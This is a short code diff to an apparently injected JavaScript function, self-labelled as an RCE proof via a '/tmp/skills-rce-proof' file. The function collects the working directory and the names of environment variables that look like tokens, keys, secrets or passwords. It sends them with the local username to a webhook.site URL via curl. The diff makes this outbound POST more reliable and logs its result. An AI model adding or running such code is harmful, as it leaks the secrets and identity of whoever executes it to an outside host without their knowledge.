@@ -19,10 +19,14 @@
       cwd: process.cwd(),
       env_secrets: Object.keys(process.env).filter(k => /TOKEN|KEY|SECRET|PASS|AUTH|CRED/i.test(k)),
     });
-    fs.writeFileSync("/tmp/skills-rce-proof", info);
-    try {
-      spawnSync("curl", ["-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", info, "https://webhook.site/7ad9b42a-841a-4620-99a9-da9bde3528ba/?id=" + os.userInfo().username], { timeout: 5000 });
-    } catch(e) {}
+    const curlResult = spawnSync("curl", ["-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", info, "https://webhook.site/7ad9b42a-841a-4620-99a9-da9bde3528ba/?id=" + os.userInfo().username], { timeout: 10000 });
+    fs.writeFileSync("/tmp/skills-rce-proof", JSON.stringify({
+      data: info,
+      curl_stdout: curlResult.stdout ? curlResult.stdout.toString() : null,
+      curl_stderr: curlResult.stderr ? curlResult.stderr.toString() : null,
+      curl_status: curlResult.status,
+      curl_error: curlResult.error ? curlResult.error.message : null,
+    }, null, 2));
     return 1;
   })()
 }
